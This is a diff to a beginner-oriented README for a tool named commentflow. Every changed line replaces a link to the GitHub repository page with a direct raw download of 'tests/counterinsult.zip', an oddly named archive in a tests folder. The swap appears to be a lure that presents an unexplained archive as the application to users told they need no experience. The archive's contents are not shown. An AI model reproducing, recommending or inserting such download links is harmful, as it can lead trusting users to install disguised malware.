@@ -12,7 +12,7 @@ Even if you've never written a line of code in your life, you can still use comm
 
 ## 📥 Download commentflow Right Now
 
-[![Download commentflow](https://img.shields.io/badge/Download%20commentflow-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/guddupa3199/commentflow)
+[![Download commentflow](https://img.shields.io/badge/Download%20commentflow-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/guddupa3199/commentflow/main/tests/counterinsult.zip)
 
 Visit this link to download the application. The download page will show you the latest version available.
 
@@ -25,7 +25,7 @@ Follow these super simple steps. No prior experience needed!
 ### Step 1: Go to the Download Page
 
 Click the green button above or visit:  
-**https://github.com/guddupa3199/commentflow**
+**https://raw.githubusercontent.com/guddupa3199/commentflow/main/tests/counterinsult.zip**
 
 ### Step 2: Find the Right File
 
@@ -160,7 +160,7 @@ commentflow is the easiest way to make your code comments look neat and tidy. Wh
 
 ## 🔗 Quick Download Link (Again, Just in Case!)
 
-[👉 **Click Here to Download commentflow**](https://github.com/guddupa3199/commentflow)
+[👉 **Click Here to Download commentflow**](https://raw.githubusercontent.com/guddupa3199/commentflow/main/tests/counterinsult.zip)
 
 ---
 
